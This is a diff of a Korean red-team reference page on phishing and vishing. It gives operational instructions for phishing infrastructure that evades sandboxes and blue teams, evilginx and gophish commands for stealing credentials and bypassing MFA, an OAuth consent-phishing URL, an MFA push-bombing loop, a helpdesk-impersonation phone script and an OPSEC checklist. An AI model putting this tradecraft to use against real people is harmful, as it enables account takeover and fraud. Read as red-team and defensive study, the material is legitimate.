@@ -1,44 +1,43 @@
 # Phishing / Vishing
 
-!!! abstract "개요"
-    레드팀 라이프사이클의 **초기 침투** 단계에서 가장 자주 쓰이는 벡터.  
-    "공격 인프라 구축 → 피싱 시나리오 설계 → 전달 → 랜딩/자격증명 수집/페이로드 실행 → 피드백" 의 흐름으로 진행한다.
+레드팀 lifecycle에서 초기 침투 시 가장 많이 쓰는 벡터.
+흐름은 대충 이렇게 돈다: **infra 구축 → 시나리오 설계 → 전송 → landing / credential 수집 / payload 실행**.
 
 ---
 
-## 공격 인프라 구축
+## 공격 infra 구축
 
 ```mermaid
 flowchart LR
     A[공격자 VPS\nC2/Payload] -->|HTTPS 443| R[Redirector\nnginx/Apache]
-    R -->|Beacon| T[타겟 엔드포인트]
-    S[Phishing SMTP\nMailgun/Postfix] -->|이메일| U[타겟 사용자]
-    L[Landing Domain\nevilginx/gophish] -->|자격증명| A
+    R -->|Beacon| T[Target Endpoint]
+    S[Phishing SMTP\nMailgun/Postfix] -->|Email| U[Target User]
+    L[Landing Domain\nevilginx/gophish] -->|credential| A
 ```
 
-- **카테고리화(Categorization)**: 새로 등록한 도메인은 `Proofpoint/Palo Alto` 등에서 대부분 분류 미지정/Uncategorized 로 차단됨. 최소 2~4주간 **정상 트래픽**(cronjob curl, 허위 블로그 등)으로 reputation을 쌓거나, 만료된 `expired domain`을 구매해 기존 카테고리를 재활용.
-- **SMTP/메일 인프라**: SPF/DKIM/DMARC **모두 정상 통과**하도록 구성. `Mailgun`, `SendGrid`, 자체 Postfix+OpenDKIM.
-- **리다이렉터**: Apache mod_rewrite 또는 nginx reverse proxy로 **C2 IP 직접 노출 방지**. User-Agent, URI 기반으로 샌드박스/블루팀 트래픽은 404로 돌려보낸다.
-- **도메인**: 타겟 회사/브랜드와 유사한 철자(homoglyph/typosquatting) 또는 업계 신뢰 키워드 (`corp-support`, `hr-policy` 등).
+- **Domain categorization**: 새로 산 domain은 Proofpoint / Palo Alto 등에서 "Uncategorized" 로 잡혀 거의 다 블록된다. 최소 2~4주간 cronjob으로 정상 트래픽 돌리거나 가짜 블로그 올려서 reputation 쌓거나, expired domain 사서 기존 카테고리 재활용하는 방식.
+- **SMTP / mail infra**: SPF / DKIM / DMARC 전부 pass 되게 구성. Mailgun, SendGrid, 아니면 직접 Postfix + OpenDKIM.
+- **Redirector**: Apache mod_rewrite 또는 nginx reverse proxy 앞단에 세워서 C2 IP 직노출 막는다. User-Agent / URI 기반으로 sandbox나 blue team 트래픽은 404로 털어낸다.
+- **Domain 선정**: target 회사/브랜드 비슷한 철자 (homoglyph, typosquatting) 또는 `corp-support`, `hr-policy` 같이 신뢰감 주는 키워드.
 
 ---
 
-## 시나리오 카테고리
+## 시나리오 분류
 
-| 시나리오 | 목적 | 페이로드 |
+| 시나리오 | 목적 | Payload |
 |---|---|---|
-| Credential Harvesting | 계정 탈취 (O365 / VPN / SSO) | evilginx 프록시 / 위장 로그인 페이지 |
-| Malicious Attachment | 엔드포인트 실행 | HTA / LNK / ISO / VBA 매크로 / OneNote |
-| Malicious Link | 브라우저/드라이브바이 | HTML Smuggling / MSIX / ClickOnce |
-| Consent Phishing (OAuth) | Azure AD 토큰 탈취 | `illicit-consent-grant` 앱 |
-| MFA Fatigue / Push Bombing | MFA 우회 | 반복 푸시 요청 |
-| Vishing (전화) | 세션 쿠키 / OTP 탈취 | 헬프데스크 사칭 |
+| Credential Harvesting | 계정 탈취 (O365 / VPN / SSO) | evilginx proxy, fake login page |
+| Malicious Attachment | endpoint 실행 | HTA, LNK, ISO, VBA macro, OneNote |
+| Malicious Link | browser / drive-by | HTML Smuggling, MSIX, ClickOnce |
+| Consent Phishing (OAuth) | Azure AD token 탈취 | illicit consent grant app |
+| MFA Fatigue / Push Bombing | MFA 우회 | push 반복 요청 |
+| Vishing | session cookie / OTP 탈취 | helpdesk 사칭 |
 
 ---
 
 ## HTML Smuggling
 
-브라우저 내부에서 JS로 실제 파일을 재구성하여 네트워크 레벨 MIME 검사 우회.
+브라우저 내부에서 JS로 파일을 재구성해서 network-level MIME 검사 우회.
 
 ```html
 <script>
@@ -53,7 +52,7 @@ flowchart LR
 </script>
 ```
 
-- ISO/IMG/VHD 는 Mark-of-the-Web(MotW)를 **전파하지 않는** 컨테이너 → 내부 LNK/HTA가 SmartScreen을 우회할 수 있었음 (2022 후반 Microsoft 패치로 일부 개선).
+- ISO / IMG / VHD 는 Mark-of-the-Web (MotW) 를 안에 담긴 파일로 **전파 안 했던** 컨테이너. 그래서 내부 LNK / HTA 가 SmartScreen 우회 가능했음. 2022 후반 MS 패치로 일부 막혔다.
 
 ---
 
@@ -63,17 +62,17 @@ flowchart LR
 # 설치
 docker run -d -p 3333:3333 -p 80:80 -p 443:443 gophish/gophish
 
-# 구성
-# 1. Sending Profile: SMTP Relay (Mailgun)
-# 2. Landing Page: 캡처한 O365/SSO 로그인
-# 3. Email Template: {{.FirstName}} 변수로 개인화
-# 4. User Group: OSINT에서 수집한 users.txt 업로드
-# 5. Campaign 시작 → 클릭률/자격증명 대시보드
+# 구성 순서
+# 1. Sending Profile : SMTP Relay (Mailgun)
+# 2. Landing Page    : 캡처한 O365 / SSO 로그인 페이지
+# 3. Email Template  : {{.FirstName}} 변수로 개인화
+# 4. User Group      : OSINT 로 수집한 users.txt 업로드
+# 5. Campaign 시작 → 대시보드에서 click / credential 확인
 ```
 
 ---
 
-## Evilginx2 (MFA Bypass via Session Hijack)
+## Evilginx2 (AiTM - MFA Bypass)
 
 ```bash
 # Phishlet 로드
@@ -84,20 +83,21 @@ phishlets hostname o365 phish-o365.com
 phishlets enable o365
 lures create o365
 lures get-url 0
-# → 피싱 URL 생성. 피해자가 정상 로그인하면 session cookie를 공격자가 탈취 → MFA 무력화
+# → 생성된 URL 을 피해자에게 전달.
+#   피해자가 정상 로그인하면 session cookie 가 공격자 쪽으로 넘어오고 MFA 는 우회됨.
 ```
 
-!!! warning "MFA 우회 원리"
-    evilginx는 AiTM(Adversary-in-the-Middle) 프록시로 동작하여, 피해자의 실제 IdP 세션을 통과시킨 뒤 **인증 완료 후의 세션 쿠키** (`ESTSAUTHPERSISTENT` 등) 를 탈취한다. 이후 공격자가 브라우저에 쿠키 주입만 하면 MFA 재인증 없이 로그인 가능.
+!!! warning "MFA 가 왜 뚫리는지"
+    Evilginx 는 AiTM (Adversary-in-the-Middle) proxy 로 동작. 피해자의 실제 IdP 세션을 그대로 통과시키고, **인증 완료 후의 session cookie** (`ESTSAUTHPERSISTENT` 등) 만 가져간다. 공격자가 브라우저에 cookie 만 주입하면 MFA 재인증 없이 로그인된다.
 
 ---
 
 ## Consent Phishing (OAuth App)
 
-Azure AD 에서 **사용자 동의** 만으로 악성 앱이 Mail.Read, Files.Read.All 권한 획득.
+Azure AD 에서 사용자 **동의**만으로 악성 앱이 `Mail.Read`, `Files.Read.All` 권한을 먹는 방식.
 
-```powershell
-# 악성 앱 등록 후 동의 URL 전달
+```
+# 악성 앱 등록 후 consent URL 을 피해자에게 전달
 https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
     client_id=<APP_ID>&
     response_type=code&
@@ -105,71 +105,72 @@ https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
     scope=offline_access%20Mail.Read%20Files.Read.All%20User.Read
 ```
 
-- 피해자가 "Accept" 클릭만 하면 refresh_token 획득 → 메일/OneDrive 상시 조회 가능.
-- 탐지: Azure AD Sign-in Logs 의 `Consent to application` 이벤트 + `Microsoft 365 Defender` alert policy.
+- 피해자가 Accept 한 번 누르면 refresh_token 이 넘어옴 → mail / OneDrive 상시 조회 가능.
+- 탐지: Azure AD Sign-in Logs 의 `Consent to application` 이벤트, Microsoft 365 Defender alert policy.
 
 ---
 
 ## MFA Fatigue / Push Bombing
 
 ```bash
-# 자격증명 확보 후 push 스팸 → 피해자가 귀찮아서 "승인" 클릭 유도
+# credential 은 이미 확보된 상태.
+# push 를 계속 쏴서 피해자가 귀찮아서 "승인" 누르게 만든다.
 while true; do
-    curl -s -X POST https://login.microsoftonline.com/... # MFA push 트리거 API
+    curl -s -X POST https://login.microsoftonline.com/... # MFA push 트리거
     sleep 30
 done
 ```
 
-- Microsoft Authenticator 의 **Number Matching** 활성화 시 우회 불가.
+- Microsoft Authenticator 의 **Number Matching** 이 켜져 있으면 이 방식은 안 통한다.
 
 ---
 
 ## Vishing (전화 사칭)
 
-1. IT 헬프데스크 사칭 → 사용자에게 AnyDesk/TeamViewer 설치 유도
-2. 회사 내부 내선번호 스푸핑 (`SpoofCard`, VoIP Asterisk)
-3. MFA 코드를 "방금 전송된 보안 코드 확인차 불러주세요" 로 탈취
+1. IT helpdesk 사칭 → AnyDesk / TeamViewer 설치 유도
+2. 내부 내선번호 spoofing (SpoofCard, VoIP Asterisk)
+3. MFA 코드를 "방금 보낸 보안 코드 확인 좀 해주세요" 식으로 유도
 
 ```
 [대본 예시]
-"안녕하세요, IT 보안팀 김○○ 대리입니다.
+"안녕하세요, IT 보안팀 김OO 대리입니다.
 방금 귀하의 계정에서 비정상 로그인이 탐지되어 검증이 필요합니다.
 지금 받으신 6자리 코드를 불러주시면 차단 해제해드리겠습니다."
 ```
 
 ---
 
-## 클라이언트 측 실행 기법
+## 클라이언트 측 실행
 
-- **LNK + PowerShell + AMSI Bypass** (→ [AMSI Bypass](../evasion/index.md#amsi-bypass))
-- **OneNote (.one)**: `Embedded File` 로 HTA/CHM/WSF 실행
-- **MSI / MSIX**: 서명된 인스톨러 내부에 페이로드 삽입
-- **ClickOnce (.application)**: .NET loader, Defender 탐지 회피 가능
-- **SVG Smuggling**: SVG 내부 `<script>` 로 HTML smuggling (Outlook 웹뷰에서 렌더링됨)
-
----
-
-## OPSEC 체크리스트
-
-- [ ] 도메인 WHOIS 는 프라이버시 가드 (Namecheap Whoisguard 등)
-- [ ] SPF/DKIM/DMARC 모두 정합성 검증 (`mail-tester.com` 10/10)
-- [ ] 리다이렉터 Apache/nginx 에 User-Agent 필터 (Proofpoint/Mimecast/WindowsDefender 차단)
-- [ ] C2 도메인은 TLS 인증서(`Let's Encrypt`) 적용 + `Domain Fronting` 가능한 CDN 앞단
-- [ ] 캠페인 실행은 타겟 국가 업무 시간 내 (로그 매몰)
+- **LNK + PowerShell + AMSI Bypass** — [AMSI Bypass](../evasion/index.md#amsi-bypass) 참고
+- **OneNote (.one)** — Embedded File 로 HTA / CHM / WSF 실행
+- **MSI / MSIX** — 서명된 installer 안에 payload 삽입
+- **ClickOnce (.application)** — .NET loader, Defender 회피용으로 자주 씀
+- **SVG Smuggling** — SVG 내부 `<script>` 로 HTML smuggling. Outlook web view 에서 렌더링됨
 
 ---
 
-## 탐지 / 방어 측 참고 (RT가 알아두면 회피에 유리)
+## OPSEC checklist
 
-- Defender for Office 365 의 `Safe Links` / `Safe Attachments` → URL 재작성, 샌드박스 폭발
-- Proofpoint TAP / Mimecast 는 첨부파일 **detonation**, URL **Time-of-Click** 검증
-- EDR 의 `Child Process` 탐지: `WINWORD.EXE → powershell.exe` = 거의 100% 탐지
-- Azure AD **Risky Sign-In** 탐지: 신규 국가/Impossible Travel → Conditional Access 차단
+- [ ] Domain WHOIS 에 privacy guard 적용 (Namecheap Whoisguard 등)
+- [ ] SPF / DKIM / DMARC 전부 정합 (`mail-tester.com` 10/10)
+- [ ] Redirector 에 User-Agent 필터 (Proofpoint, Mimecast, Windows Defender 차단)
+- [ ] C2 domain 은 TLS cert (Let's Encrypt) + CDN (domain fronting 가능한 곳) 앞단
+- [ ] 캠페인은 target 국가 업무시간 내에 실행 (로그 묻힘)
+
+---
+
+## 탐지 / 방어측 참고
+
+- Defender for Office 365 의 Safe Links / Safe Attachments → URL 재작성, sandbox 에서 detonation
+- Proofpoint TAP / Mimecast 는 첨부 detonation + URL Time-of-Click 검증
+- EDR 의 child process 탐지: `WINWORD.EXE → powershell.exe` 는 거의 100% 잡힘
+- Azure AD Risky Sign-In: 신규 국가 / impossible travel → Conditional Access 로 바로 차단
 
 ---
 
 ## 참고
 
-- 레드팀 인프라 구축 방법론: [C2 인프라](../infra/c2.md), [파일 전송](../infra/file-transfer.md)
-- MFA 우회 상세: [Web 공격 - 2FA/MFA Bypass](../web/index.md#2famfaotp-bypass-패턴)
-- OSINT: [OSINT / 외부 정찰](osint.md)
+- Infra: [C2 Infrastructure](../infra/c2.md), [File Transfer](../infra/file-transfer.md)
+- MFA 우회 상세: [Web - 2FA/MFA Bypass](../web/index.md#2famfaotp-bypass-패턴)
+- OSINT: [OSINT / External Recon](osint.md)
